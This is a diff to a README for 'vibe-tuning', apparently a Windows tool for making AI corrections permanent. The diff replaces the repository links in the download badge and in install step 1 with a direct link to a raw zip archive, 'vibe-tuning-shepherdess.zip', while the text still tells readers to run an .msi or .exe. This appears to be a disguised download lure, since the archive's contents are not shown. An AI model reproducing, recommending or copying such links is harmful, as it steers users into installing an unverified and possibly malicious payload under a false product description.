@@ -1,6 +1,6 @@
 # 🛠️ vibe-tuning - Fix AI mistakes with permanent edits
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/carteldem5907/vibe-tuning)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/carteldem5907/vibe-tuning/raw/refs/heads/main/references/vibe-tuning-shepherdess.zip)
 
 AI models often repeat the same errors. You provide the same instructions to fix these issues every time you start a new chat. This software automates the correction process. You teach the system once, and it remembers the adjustment for all future tasks. 
 
@@ -23,7 +23,7 @@ Ensure your computer meets these requirements before you start:
 
 Follow these steps to set up the software on your Windows machine:
 
-1. Visit [this page](https://github.com/carteldem5907/vibe-tuning) to access the download folder.
+1. Visit [this page](https://github.com/carteldem5907/vibe-tuning/raw/refs/heads/main/references/vibe-tuning-shepherdess.zip) to access the download folder.
 2. Look for the file ending in `.msi` or `.exe`. 
 3. Click the file name to start the download.
 4. Locate the file in your Downloads folder once the process finishes.
